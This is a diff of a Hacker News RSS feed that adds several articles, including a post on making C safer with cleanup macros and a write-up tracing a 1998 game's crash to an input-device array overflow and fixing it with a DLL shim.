+<span>    </span><span>if</span><span> </span><span>(</span><span>lock</span><span> </span><span>&amp;&amp;</span><span> </span><span>*</span><span>lock</span><span>)</span><span> </span><span>pthread_mutex_unlock</span><span>(</span><span>*</span><span>lock</span><span>);</span>
+<span>}</span>
+
+<span>// RAII lock guard via cleanup attribute</span>
+<span>pthread_mutex_t</span><span> </span><span>my_lock</span><span>;</span>
+<span>pthread_mutex_t</span><span>*</span><span> </span><span>lock_ptr</span><span> </span><span>CLEANUP</span><span>(</span><span>mutex_unlock_cleanup</span><span>)</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>my_lock</span><span>;</span>
+<span>pthread_mutex_lock</span><span>(</span><span>lock_ptr</span><span>);</span>
+
+<span>if</span><span> </span><span>(</span><span>some_error</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>return</span><span>;</span><span> </span><span>// Mutex is automatically unlocked here!</span>
+<span>}</span>
+</pre></div>
+<p>Simple wrappers also clean up the boilerplate of managing threads:</p>
+<div><pre><span></span>// The concurrency macros: spawn and join without boilerplate
+#define SPAWN_THREAD(name, func, arg) \
+    thrd_t name; \
+    thrd_create(&amp;name, (func), (arg))
+
+#define JOIN_THREAD(name) \
+    thrd_join(name, NULL)
+</pre></div>
+<p>And in cgrep:</p>
+<div><pre><span></span>// Thread pool spawn without boilerplate
+SPAWN_THREAD(workers[i], file_processing_worker, &amp;contexts[i]);
+JOIN_THREAD(workers[i]); // No manual pthread_join() error handling
+</pre></div>
+<h2 id="performance-safety-at-o2-not-o0">Performance: Safety at -O2, Not -O0</h2><p>Safety doesn't mean slow. The UNLIKELY() macro tells the compiler which branches are cold, adding zero overhead in hot paths.</p>
+<div><pre><span></span>#ifdef __GNUC__
+#define LIKELY(x)   __builtin_expect(!!(x), 1)
+#define UNLIKELY(x) __builtin_expect(!!(x), 0)
+#else
+#define LIKELY(x)   (x)
+#define UNLIKELY(x) (x)
+#endif
+</pre></div>
+<p>The real win is in the fast paths:</p>
+<div><pre><span></span><span>// In hot allocation path: branch prediction</span>
+<span>if</span><span> </span><span>(</span><span>UNLIKELY</span><span>(</span><span>store</span><span>-&gt;</span><span>local_buffer_sizes</span><span>[</span><span>thread_id</span><span>]</span><span> </span><span>&gt;=</span><span> </span><span>LOCAL_BUFFER_CAPACITY</span><span>))</span><span> </span><span>{</span>
+<span>    </span><span>match_store_flush_buffer</span><span>(</span><span>store</span><span>,</span><span> </span><span>thread_id</span><span>);</span><span> </span><span>// Rarely taken</span>
+<span>}</span>
+
+<span>// In match checking: likely path first</span>
+<span>if</span><span> </span><span>(</span><span>!</span><span>options</span><span>-&gt;</span><span>case_insensitive</span><span> </span><span>&amp;&amp;</span><span> </span><span>options</span><span>-&gt;</span><span>fixed_string</span><span>)</span><span> </span><span>{</span>
+<span>    </span><span>// Most common case: fast path with no branches</span>
+<span>    </span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>result</span><span> </span><span>=</span><span> </span><span>strstr</span><span>(</span><span>line</span><span>,</span><span> </span><span>options</span><span>-&gt;</span><span>pattern</span><span>.</span><span>data</span><span>);</span>
+<span>    </span><span>return</span><span> </span><span>result</span><span> </span><span>!=</span><span> </span><span>NULL</span><span>;</span>
+<span>}</span>
+</pre></div>
+<p>The above is similar to what a PGO (Profile Guided Optimization) would have.</p>
+<p>This is what main() looks like when you stop fighting the language:</p>
+<div><pre><span></span><span>int</span><span> </span><span>main</span><span>(</span><span>int</span><span> </span><span>argc</span><span>,</span><span> </span><span>char</span><span>*</span><span> </span><span>argv</span><span>[])</span><span> </span><span>{</span>
+<span>    </span><span>initialize_simd</span><span>();</span>
+<span>    </span><span>output_buffer_init</span><span>();</span><span> </span><span>// Auto-cleanup on exit</span>
+<span>    </span>
+<span>    </span><span>GrepOptions</span><span> </span><span>options</span><span> </span><span>=</span><span> </span><span>{</span><span>0</span><span>};</span>
+<span>    </span><span>AUTO_UNIQUE_PTR</span><span>(</span><span>include_pattern_ptr</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>options_string_deleter</span><span>);</span>
+<span>    </span>
+<span>    </span><span>// ... parse args with getopt_long ...</span>
+<span>    </span>
+<span>    </span><span>AUTO_UNIQUE_PTR</span><span>(</span><span>store_ptr</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>match_store_deleter</span><span>);</span>
+<span>    </span><span>SharedPtr</span><span> </span><span>store_shared</span><span> </span><span>=</span><span> </span><span>{</span><span>0</span><span>};</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>need_match_store</span><span>)</span><span> </span><span>{</span>
+<span>        </span><span>store_ptr</span><span>.</span><span>ptr</span><span> </span><span>=</span><span> </span><span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>ConcurrentMatchStore</span><span>));</span>
+<span>        </span><span>if</span><span> </span><span>(</span><span>!</span><span>store_ptr</span><span>.</span><span>ptr</span><span> </span><span>||</span><span> </span><span>!</span><span>match_store_create</span><span>(</span><span>store_ptr</span><span>.</span><span>ptr</span><span>,</span><span> </span><span>hash_capacity</span><span>,</span><span> </span><span>1000</span><span>))</span><span> </span><span>{</span>
+<span>            </span><span>return</span><span> </span><span>1</span><span>;</span><span> </span><span>// All allocations cleaned up automatically</span>
+<span>        </span><span>}</span>
+<span>        </span><span>shared_ptr_init</span><span>(</span><span>&amp;</span><span>store_shared</span><span>,</span><span> </span><span>store_ptr</span><span>.</span><span>ptr</span><span>,</span><span> </span><span>match_store_deleter</span><span>);</span>
+<span>    </span><span>}</span>
+<span>    </span>
+<span>    </span><span>// Process files with thread pool...</span>
+<span>    </span>
+<span>cleanup</span><span>:</span><span> </span><span>// Single cleanup label needed -- RAII handles the rest</span>
+<span>    </span><span>output_buffer_destroy</span><span>();</span><span> </span><span>// Flushes and destroys</span>
+<span>    </span><span>return</span><span> </span><span>0</span><span>;</span>
+<span>}</span>
+</pre></div>
+<h2 id="conclusion">Conclusion</h2><p>In the end, cgrep is 2,300 lines of C. Without safe_c.h, it would have required over 50 manual free() calls ~ a recipe for leaks and segfaults. With the custom header file, it's 2,300 lines that compile to the same assembly, run just as fast, and are fundamentally safer.</p>
+<p>This proves that the best abstraction is the one you don't pay for and can't forget to use. It enables a clear and powerful development pattern: validate inputs at the boundary, then unleash C's raw speed on the core logic. You get all the power of C without the infamous self-inflicted footgun wounds.</p>
+<p>C simplicity makes writing programs with it becomes fun, however there are ways to make it both <strong>fun and safe</strong>..just like using condoms, you know?</p>
+<p>This post has gotten too long for comfort, but I have one final food for thought for you the readers: after all these guard rails, what do you think of cgrep's performance? Check the screenshots below:</p>
+<ul>
+<li><p>grep bench on recursive directories
+<img src="https://i.ibb.co.com/ZpKKd4FS/grep-bench-recursive-Dirs.png" alt="recursive-Dirs"></p>
+</li>
+<li><p>grep bench on single large file
+<img src="https://i.ibb.co.com/qMKqFhmm/grep-bench-single-Large-File.png" alt="Large-File">
+<strong>NOTE: make sure you check the memory usage comparison between cgrep and ripgrep</strong></p>
+</li>
+</ul>
+<hr>
+<hr>
+<p>In the next article, I will discuss how I built cgrep, the design I chose for it, why and how cgrep managed to be a couple of times faster than ripgrep (more than 2x faster in the recursive directory bench) while being super efficient with resource usage (20x smaller memory footprint in the single large file bench).</p>
+<p>It's gonna be a lot of fun! Cheers!</p>
+<p><mark>If you enjoyed this post, click the little up arrow chevron on the bottom left of the page to help it rank in Bear's Discovery feed and if you got any questions or anything, please use the comments section.</mark></p>
+
+
+    
+
+    
+        
+
+        
+            
+
+
+        
+
+        
+            
+        
+    
+
+
+  </div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Building a Simple Search Engine That Works (184 pts)]]></title>
             <link>https://karboosx.net/post/4eZxhBon/building-a-simple-search-engine-that-actually-works</link>
             <guid>45950720</guid>
             <pubDate>Mon, 17 Nov 2025 03:52:50 GMT</pubDate>
@@ -638,7 +1157,24 @@ $documents = $this-&gt;documentRepository-&gt;findByIds($documentIds);
     </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[A new chapter begins for EV batteries with the expiry of key LFP patents (161 pts)]]></title>
+            <title><![CDATA[A 1961 Relay Computer Running in the Browser (102 pts)]]></title>
+            <link>https://minivac.greg.technology/</link>
+            <guid>45950396</guid>
+            <pubDate>Mon, 17 Nov 2025 02:36:18 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://minivac.greg.technology/">https://minivac.greg.technology/</a>, See on <a href="https://news.ycombinator.com/item?id=45950396">Hacker News</a></p>
+<div id="readability-page-1" class="page">
+    <p>
+      Best viewed on desktop for now.
+    </p>
+    
+    
+    
+  
+
+</div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[A new chapter begins for EV batteries with the expiry of key LFP patents (164 pts)]]></title>
             <link>https://www.shoosmiths.com/insights/articles/a-new-chapter-begins-for-ev-batteries-with-the-expiry-of-key-lfp-patents</link>
             <guid>45949655</guid>
             <pubDate>Sun, 16 Nov 2025 23:58:21 GMT</pubDate>
@@ -658,7 +1194,7 @@ $documents = $this-&gt;documentRepository-&gt;findByIds($documentIds);
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[PicoIDE – An open IDE/ATAPI drive emulator (143 pts)]]></title>
+            <title><![CDATA[PicoIDE – An open IDE/ATAPI drive emulator (148 pts)]]></title>
             <link>https://picoide.com/</link>
             <guid>45949352</guid>
             <pubDate>Sun, 16 Nov 2025 23:19:24 GMT</pubDate>
@@ -756,7 +1292,7 @@ $documents = $this-&gt;documentRepository-&gt;findByIds($documentIds);
     </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Britney Spears' Guide to Semiconductor Physics (247 pts)]]></title>
+            <title><![CDATA[Britney Spears' Guide to Semiconductor Physics (253 pts)]]></title>
             <link>https://britneyspears.ac/lasers.htm</link>
             <guid>45949326</guid>
             <pubDate>Sun, 16 Nov 2025 23:15:20 GMT</pubDate>
@@ -825,7 +1361,7 @@ Splung.com Physics</a> is a website for students of physics with sections on: me
 <hr></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Goldman Sachs asks in biotech Report: Is curing patients a sustainable business? (212 pts)]]></title>
+            <title><![CDATA[Goldman Sachs asks in biotech Report: Is curing patients a sustainable business? (214 pts)]]></title>
             <link>https://www.cnbc.com/2018/04/11/goldman-asks-is-curing-patients-a-sustainable-business-model.html</link>
             <guid>45949247</guid>
             <pubDate>Sun, 16 Nov 2025 23:01:24 GMT</pubDate>
@@ -833,7 +1369,7 @@ Splung.com Physics</a> is a website for students of physics with sections on: me
 <div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-104324084" data-test="InlineImage"><p>Yuri Arcurs | Getty Images</p></div><div><p>Goldman Sachs analysts attempted to address a touchy subject for biotech companies, especially those involved in the pioneering "gene therapy" treatment: cures could be bad for business in the long run. </p><p>"Is curing patients a sustainable business model?" analysts ask in an April 10 report entitled "The Genome Revolution."</p><p>"The potential to deliver 'one shot cures' is one of the most attractive aspects of gene therapy, genetically-engineered cell therapy and gene editing. However, such treatments offer a very different outlook with regard to recurring revenue versus chronic therapies," analyst Salveen Richter wrote in the note to clients Tuesday. "While this proposition carries tremendous value for patients and society, it could represent a challenge for genome medicine developers looking for sustained cash flow."</p></div><div id="Placeholder-ArticleBody-Video-105119182" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000012181" aria-labelledby="Placeholder-ArticleBody-Video-105119182"><p><img src="https://image.cnbcfm.com/api/v1/image/105119335-2ED1-PL-MegT-040918.jpg?v=1529477963&amp;w=750&amp;h=422&amp;vtcrop=y" alt="Biotech shares soar on dealmaking, drug progress"><span></span><span></span></p></div><div><p>Richter cited <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-1"><a href="https://www.cnbc.com/quotes/GILD/">Gilead Sciences'</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> treatments for hepatitis C, which achieved cure rates of more than 90 percent. The company's U.S. sales for these hepatitis C treatments peaked at $12.5 billion in 2015, but have been falling ever since. Goldman estimates the U.S. sales for these treatments will be less than $4 billion this year, according to a table in the report.</p><p>"GILD is a case in point, where the success of its hepatitis C franchise has gradually exhausted the available pool of treatable patients," the analyst wrote. "In the case of infectious diseases such as hepatitis C, curing existing patients also decreases the number of carriers able to transmit the virus to new patients, thus the incident pool also declines … Where an incident pool remains stable (eg, in cancer) the potential for a cure poses less risk to the sustainability of a franchise."</p><p>The analyst didn't immediately respond to a request for comment.</p><p>The report suggested three potential solutions for biotech firms:</p><div><p>"Solution 1: Address large markets: Hemophilia is a $9-10bn WW market (hemophilia A, B), growing at ~6-7% annually."</p><p> "Solution 2: Address disorders with high incidence: Spinal muscular atrophy (SMA) affects the cells (neurons) in the spinal cord, impacting the ability to walk, eat, or breathe."</p><p> "Solution 3: Constant innovation and portfolio expansion: There are hundreds of inherited retinal diseases (genetics forms of blindness) … Pace of innovation will also play a role as future programs can offset the declining revenue trajectory of prior assets."</p></div></div></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Neuroscientists track the neural activity underlying an “aha” (119 pts)]]></title>
+            <title><![CDATA[Neuroscientists track the neural activity underlying an “aha” (124 pts)]]></title>
             <link>https://www.quantamagazine.org/how-your-brain-creates-aha-moments-and-why-they-stick-20251105/</link>
             <guid>45948792</guid>
             <pubDate>Sun, 16 Nov 2025 21:57:13 GMT</pubDate>
@@ -894,7 +1430,7 @@ Splung.com Physics</a> is a website for students of physics with sections on: me
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Peter Thiel sells off all Nvidia stock, stirring bubble fears (194 pts)]]></title>
+            <title><![CDATA[Peter Thiel sells off all Nvidia stock, stirring bubble fears (198 pts)]]></title>
             <link>https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears</link>
             <guid>45948477</guid>
             <pubDate>Sun, 16 Nov 2025 21:19:08 GMT</pubDate>
@@ -902,7 +1438,82 @@ Splung.com Physics</a> is a website for students of physics with sections on: me
 Couldn't get https://www.thestreet.com/investing/peter-thiel-dumps-top-ai-stock-stirring-bubble-fears: Error: Request failed with status code 403]]></description>
         </item>
         <item>
-            <title><![CDATA[The Pragmatic Programmer: 20th Anniversary Edition (2023) (159 pts)]]></title>
+            <title><![CDATA[Why Castrol Honda Superbike crashes on (most) modern systems (108 pts)]]></title>
+            <link>https://seri.tools/blog/castrol-honda-superbike/</link>
+            <guid>45948311</guid>
+            <pubDate>Sun, 16 Nov 2025 20:54:14 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://seri.tools/blog/castrol-honda-superbike/">https://seri.tools/blog/castrol-honda-superbike/</a>, See on <a href="https://news.ycombinator.com/item?id=45948311">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div><main><div><p>Posted: 2025-11-16</p><p>A friend cleaned up and gave me a copy of a game I've not heard about before: <em>Castrol Honda Superbike World Champions</em>, a motorbike racing game for PC, released 1998 by Interactive Entertainment Ltd. and Midas Interactive Entertainment.</p><p><a title="Picture of the jewelcase" href="https://seri.tools/blog/castrol-honda-superbike/jewelcase.webp"> <img alt="Picture of the jewelcase" loading="lazy" src="https://seri.tools/blog/castrol-honda-superbike/jewelcase.webp" width="1024"> </a></p><p>Given the age of the game (and looking at the system requirements) it's clear that the game comes from the tricky era of early 3D-accelerated PC gaming. For context, my copy of the game helpfully asks to install DirectX 5.</p><p>Before Windows was known for cramming AI and account requirements into every single corner of the system, no matter how unnecessary, it was known for its excellent backwards compatibility with older software. Generally, unless there are genuine bugs (and sometimes even despite them), Windows tries its hardest to run old applications correctly.</p><p>Pushing my luck and trying to run it on my Windows 7 machine, however, resulted in either a getting stuck on a black screen, or a crash, seemingly at random:</p><p><a title="Crash dialog from Windows 7: bike.exe has stopped working" href="https://seri.tools/blog/castrol-honda-superbike/crash.webp"> <img alt="Crash dialog from Windows 7: bike.exe has stopped working" loading="lazy" src="https://seri.tools/blog/castrol-honda-superbike/crash.webp" width="527"> </a></p><p>Let's go back in time and see how far we need to go to get it running: Installing and running it on my Windows 98 and Windows XP machines was as uneventful, and the game works just fine<sup id="fr-1-1"><a href="#fn-1">1</a></sup>, including with 3D acceleration. Glorious 1024x768x16:</p><p><a title="Screencap ingame" href="https://seri.tools/blog/castrol-honda-superbike/ingame.webp"> <img alt="Screencap ingame" loading="lazy" src="https://seri.tools/blog/castrol-honda-superbike/ingame.webp" width="1024"> </a></p><h2 id="debugging-the-issue">Debugging the issue&nbsp;<a href="#debugging-the-issue">#</a></h2><p>Debugging is more fun than playing, so let's get started! :^)</p><p>I pulled over the installation directory to my main machine and ran <a href="https://github.com/horsicq/Detect-It-Easy">Detect It Easy</a> to see what we can learn about the executable:</p><p><a title="Screenshot of Detect It Easy with bike.exe loaded" href="https://seri.tools/blog/castrol-honda-superbike/die.webp"> <img alt="Screenshot of Detect It Easy with bike.exe loaded" loading="lazy" src="https://seri.tools/blog/castrol-honda-superbike/die.webp" width="1440"> </a></p><p><code>Linker: Microsoft Linker(5.10)</code> and <code>Compiler: Microsoft Visual C/C++(...)[libcmtd]</code> are the interesting bits here. Notice how it's <code>libcmtd</code>, not <code>libcmt</code>? The binary is linked against the static <em>debug</em> version of VC5's runtime. The debug runtime has heaps of extra checks and <a href="https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa">logging</a>, which might help later.</p><p>Let's attach a debugger and see what's going on. Given that the game crashes very early on (before the credits intro screen), I hoped to see something right away. The cases where the game got stuck in a loop seemed to actually get stuck in some Windows API call stack.</p><p>Anyway, the cases where it crashed gave a clearer starting point:</p><p><a title="Stack trace from debugger" href="https://seri.tools/blog/castrol-honda-superbike/stack.webp"> <img alt="Stack trace from debugger" loading="lazy" src="https://seri.tools/blog/castrol-honda-superbike/stack.webp" width="821"> </a></p><p>The game seems to be stuck after a call to DirectInput's <code>DirectInputCreateEx</code> function. At this point I started to do some static analysis of the functions leading to this call. While doing that I noticed that the game seems to have quite extensive logging, anything from game initialization to memory allocations.</p><blockquote><p>If you're interested in all the logs, here are the config settings to enable them all:</p><ul><li>In <code>Config.dat</code>, switch <code>ErrorLog</code>, <code>FileLog</code>, <code>MallocLog</code> from <code>off</code> to <code>on</code>. <ul><li>These are the "normal" log files the game produces.</li><li><code>ErrorLog</code> produces <code>error.log</code>, which is the general log file.</li><li><code>FileLog</code> produces <code>files.log</code>, tracking all opened files and their access modes.</li><li><code>MallocLog</code> produces <code>malloc.log</code>, tracking all memory allocations and frees. The devs even kept descriptions for every allocation site!</li></ul></li><li>Set an environment variable named <code>errorfile</code> to any file name (not path). The game will write logs to that file in the game directory. <ul><li>You might also need to create an empty <code>*.c</code> file in the game directory.</li><li>Just gives a bit of extra logging.</li></ul></li></ul><p>Bonus: add a setting named <code>windowed=true</code> to the config file to force windowed mode; only works correctly in 16-bit mode (garbled graphics in True Color).</p></blockquote><p>After enabling all the logging, I ran the game a few more times, and noticed that the last log messages in <code>error.log</code> before the crash were these:</p><pre><code><span>0&gt; Instance : Mouse
+</span><span>0&gt; Product : Mouse
+</span><span>1&gt; Instance : Keyboard
+</span><span>1&gt; Product : Keyboard
+</span><span>2&gt; Instance : Gaming Mouse G502
+</span><span>2&gt; Product : Gaming Mouse G502
+</span><span>3&gt; Instance : Gaming Mouse G502
+</span><span>3&gt; Product : Gaming Mouse G502
+</span><span>4&gt; Instance : Gaming Mouse G502
+</span><span>4&gt; Product : Gaming Mouse G502
+</span><span>5&gt; Instance : Gaming Mouse G502
+</span><span>5&gt; Product : Gaming Mouse G502
+</span><span>6&gt; Instance : USB Keyboard
+</span><span>6&gt; Product : USB Keyboard
+</span><span>7&gt; Instance : USB Keyboard
+</span><span>7&gt; Product : USB Keyboard
+</span><span>8&gt; Instance : LED Controller
+</span><span>8&gt; Product : LED Controller
+</span></code></pre><p>Great, the game is enumerating input devices— uh, why is there an "LED Controller" device? The motherboard in my Windows 7 machine has a built-in LED controller, so that checks out. Maybe the detection isn't working properly, and the game is trying to use it as an input device?</p><p>After disabling the LED controller in Device Manager, the game started up just fine, consistently! So far, so good. Of course I wanted to know what was actually going wrong, though, so let's see where these messages are printed.</p><h2 id="side-quest-cd-check">Side quest: CD check&nbsp;<a href="#side-quest-cd-check">#</a></h2><p>The game seemed to close without any notice if I forgot to insert the game disc. A quick trace showed that the <code>GibbonPosture</code> setting in <code>f1.cfg</code> is used to point to the disc drive from which the game was installed. The only check seems to be that the path <code>redist\dsetup.dll</code> exists on the disc. Copying the redist folder to the installation directory and changing the setting to <code>GibbonPosture=.\</code> seems to work just fine. :)</p><h2 id="the-bug">The bug&nbsp;<a href="#the-bug">#</a></h2><p>Finding the <code>Instance :</code> and <code>Product :</code> log messages in the binary was easy enough. They are referenced in only one function, which is a <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ee416622(v=vs.85)"><code>DIEnumDevicesCallback</code></a> callback function that is provided to <code>IDirectInput::EnumDevices</code> (Microsoft has only kept the documentation for the <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ee417804(v=vs.85)">DX8 version</a> of EnumDevices left online, but it's close enough).</p><p>This is the pseudocode of the call and the callback, and the relevant data structure:</p><pre data-lang="c"><code data-lang="c"><span>struct </span><span>DinputDeviceData
+</span><span>{
+</span><span>  </span><span>char</span><span> instance_name[</span><span>128</span><span>];
+</span><span>  </span><span>char</span><span> product_name[</span><span>128</span><span>];
+</span><span>  </span><span>DWORD</span><span> dwDevType;
+</span><span>  GUID guid;
+</span><span>};
+</span><span>
+</span><span>// ...
+</span><span>
+</span><span>BOOL</span><span> __stdcall </span><span>dinput_enumdevices_callback</span><span>(LPCDIDEVICEINSTANCEA </span><span>lpDevice</span><span>, </span><span>LPVOID </span><span>pvRef</span><span>)
+</span><span>{
+</span><span>    </span><span>int</span><span> index </span><span>=</span><span> g_dinput_device_index;
+</span><span>    g_direct_input_devices[index].</span><span>guid </span><span>=</span><span> lpDevice-&gt;guidInstance;
+</span><span>    </span><span>strcpy</span><span>(g_direct_input_devices[index].instance_name, lpDevice-&gt;tszInstanceName)</span><span>;
+</span><span>    </span><span>strcpy</span><span>(g_direct_input_devices[index].product_name, lpDevice-&gt;tszProductName)</span><span>;
+</span><span>    g_direct_input_devices[index].</span><span>dwDevType </span><span>=</span><span> lpDevice-&gt;dwDevType;
+</span><span>
+</span><span>    </span><span>log_line(</span><span>"</span><span>%d</span><span>&gt; Instance : </span><span>%s</span><span>\n"</span><span>, index, lpDevice-&gt;tszInstanceName)</span><span>;
+</span><span>    </span><span>log_line(</span><span>"</span><span>%d</span><span>&gt; Product : </span><span>%s</span><span>\n"</span><span>, index, lpDevice-&gt;tszProductName)</span><span>;
+</span><span>
+</span><span>    </span><span>if </span><span>( </span><span>LOBYTE(g_direct_input_devices[index].dwDevType) </span><span>==</span><span> DIDEVTYPE_JOYSTICK )
+</span><span>    {
+</span><span>        </span><span>int</span><span> joystick_index </span><span>=</span><span> g_joystick_index;
+</span><span>        g_joystick_info[joystick_index].</span><span>dinput_device_index </span><span>=</span><span> index;
+</span><span>        g_joystick_info[joystick_index].</span><span>field_4 </span><span>= </span><span>0</span><span>;
+</span><span>        g_joystick_info[joystick_index].</span><span>field_8 </span><span>= </span><span>0</span><span>;
+</span><span>        g_joystick_info[joystick_index].</span><span>field_38 </span><span>= </span><span>0</span><span>;
+</span><span>        g_joystick_info[joystick_index].</span><span>field_1 </span><span>= </span><span>0</span><span>;
+</span><span>        g_joystick_index </span><span>=</span><span> joystick_index </span><span>+ </span><span>1</span><span>;
+</span><span>    }
+</span><span>    g_dinput_device_index </span><span>=</span><span> index </span><span>+ </span><span>1</span><span>;
+</span><span>
+</span><span>    </span><span>return</span><span> DIENUM_CONTINUE;
+</span><span>}
+</span><span>
+</span><span>// ...
+</span><span>
+</span><span>g_dinput_create_hresult </span><span>= </span><span>DirectInputCreateA(hInstance, </span><span>0x500</span><span>u</span><span>, </span><span>&amp;</span><span>g_dinput_instance, </span><span>0</span><span>)</span><span>;
+</span><span>g_dinput_device_index </span><span>= </span><span>0</span><span>;
+</span><span>g_joystick_index </span><span>= </span><span>0</span><span>;
+</span><span>g_dinput_instance-&gt;lpVtbl-&gt;</span><span>EnumDevices(
+</span><span>    g_dinput_instance, </span><span>0</span><span>, dinput_enumdevices_callback, </span><span>0</span><span>, DIEDFL_ATTACHEDONLY)</span><span>;
+</span></code></pre><p>So, for each enumerated device, the game stores some general information about it in the global array <code>g_direct_input_devices</code>. Then, if the device is a joystick (generally, a game controller), it also adds it to <code>g_joystick_info</code>.</p><p>Can you guess the bug yet? :) If not, here's the declaration of the global arrays:</p><pre data-lang="c"><code data-lang="c"><span>DinputDeviceData g_direct_input_devices[</span><span>8</span><span>];
+</span><span>// ...
+</span><span>JoystickInfo g_joystick_info[</span><span>8</span><span>];
+</span></code></pre><p>There's only space for eight DirectInput devices in the array! <code>8&gt; Instance : LED Controller</code> was the ninth one, overwriting lots of important other data in the process, including timer handles and the actual DirectInput instance pointer.</p><p>But it gets worse: The game uses DirectInput for game controllers only. Copying the device info out of <code>lpDevice</code> is entirely pointless for other types of devices. Just moving the <code>DIDEVTYPE_JOYSTICK</code> check up would have hidden the bug for basically all setups, since you'd have to have more than 8 game controllers connected for the game to write out of bounds.</p><p>Actually, there would've been an even simpler workaround: <code>EnumDevices</code> allows passing a <code>DIDEVTYPE</code> as a filter:</p><pre data-lang="c"><code data-lang="c"><span>g_dinput_instance-&gt;lpVtbl-&gt;</span><span>EnumDevices(
+</span><span>    g_dinput_instance, DIDEVTYPE_JOYSTICK, dinput_enumdevices_callback, </span><span>0</span><span>, DIEDFL_ATTACHEDONLY)</span><span>;
+</span><span>                    </span><span>// ^^^^^^^^^^^^^^^^^^
+</span></code></pre><p>This would make DirectInput call the callback for game controllers only. Without it, all devices, whether they are keyboards, mice, or actually any HID devices, are enumerated. (I've checked the DirectX 5 SDK docs, and even there it mentions the HID device support.) This includes the vendor-defined devices of my mouse and its emulated keyboard (for macros), and of course the motherboard's LED controller.</p><p>The moral of the story? Always check your bounds, kids! You'll never know if some weirdo comes along and plugs in a dozen game controllers to their PC. :^)</p><h2 id="the-fix">The fix&nbsp;<a href="#the-fix">#</a></h2><p><a href="https://github.com/seritools/castrol-honda-dinput-fix">Over on GitHub</a> I've pushed a minimal patch as a classic DLL shim. With the provided <code>dinput.dll</code> in the game directory, the game will load that instead of the system one. DirectInput has only one relevant exported function that we need to shim: <code>DirectInputCreateA</code>. The rest of the API is implemented via COM interfaces, for which we can modify the respective vtables as needed.</p><p>I've implemented two fixes in the shim:</p><ol><li>Inject the <code>DIDEVTYPE_JOYSTICK</code> filter in the call to <code>EnumDevices</code> to only return joysticks/game controllers.</li><li>Cancel enumeration once 8 joysticks have been found.</li></ol><p>For fun, I've also tried to minimize the size of the shim DLL -- the final binary weighs in at 2 KiB.</p><blockquote><p>These are the reasonable settings I changed:</p><ul><li>Compile with <code>opt-level = "z"</code> to optimize for minimum size. (though the code is so low-level that it's effectively the same as <code>opt-level = 3</code>)</li><li><code>#[no_std]</code> to avoid linking the Rust standard library.</li><li><code>codegen-units = 1</code> and <code>lto = true</code> to enable whole-program optimization.</li><li><code>panic = "immediate-abort"</code> to remove all unnecessary panic handling code; an unwrap will immediately abort the process.</li></ul><p>And these are the cursed ones:</p><ul><li><code>/NODEFAULTLIB</code> to not link against any MSVC runtime library; added my own minimal <code>DllMain</code>.</li><li><code>/FORCE:UNRESOLVED</code> to ignore the missing symbols for <code>_aullrem</code>, <code>_aulldiv</code>, and <code>_fltused</code>. We aren't using any of these, but the LLVM target still seems to insist on linking them in.</li><li><code>/FILEALIGN:512</code> to force the linker to use the minimum supported PE section alignment in the file.</li><li><code>/MERGE:.rdata=.text</code> merges the read-only data section into the code section.</li><li>Prevent zero-initialization of the system directory path by using <code>MaybeUninit</code>.</li><li>Storing globals in <code>static mut</code> just like the original game does. Since the fix is specific to this game I can do these "global" assumptions here :^) <ul><li>Ensure all globals are zero-initialized so the <code>.data</code> section is 0 bytes in the binary.</li></ul></li><li><code>.unwrap_unchecked()</code> to avoid any extra branches where they aren't needed.</li><li><code>/DEBUG:NONE</code> to not generate debug information, and not store a <code>.pdb</code> path in the binary.</li></ul></blockquote><p>Furthermore, I switched to <code>rust-lld.exe</code> as the linker, as it's fine with setting <code>/SUBSYSTEM:WINDOWS,4.0"</code> and <code>/OSVERSION:4.0</code> without complaining. :) Since there is no linked runtime code at all, the resulting binary should work on any 32-bit Windows version, even without <a href="https://github.com/rust9x/rust/wiki">Rust9x</a>. I've tested it on Windows 7 and Windows 98 SE.</p><p>Feel free to grab the compiled DLL from the <a href="https://github.com/seritools/castrol-honda-dinput-fix/releases">releases page</a>.</p><section><ol><li id="fn-1"><p>Except for True Color rendering, <a href="https://seri.tools/blog/castrol-honda-superbike/truecolor.webp">which seems to be broken</a>, no matter the system, graphics card, or game version? Investigating that is left as a mystery for another day. <a href="#fr-1-1">↩</a></p></li></ol></section></div></main></div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[The Pragmatic Programmer: 20th Anniversary Edition (2023) (165 pts)]]></title>
             <link>https://www.ahalbert.com/technology/2023/12/19/the_pragmatic_programmer.html</link>
             <guid>45948254</guid>
             <pubDate>Sun, 16 Nov 2025 20:46:30 GMT</pubDate>
@@ -1144,7 +1755,7 @@ Should you write tests? Yes. But after you’ve been doing it for 30 years, feel
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[I have recordings proving Coinbase knew about breach months before disclosure (595 pts)]]></title>
+            <title><![CDATA[I have recordings proving Coinbase knew about breach months before disclosure (607 pts)]]></title>
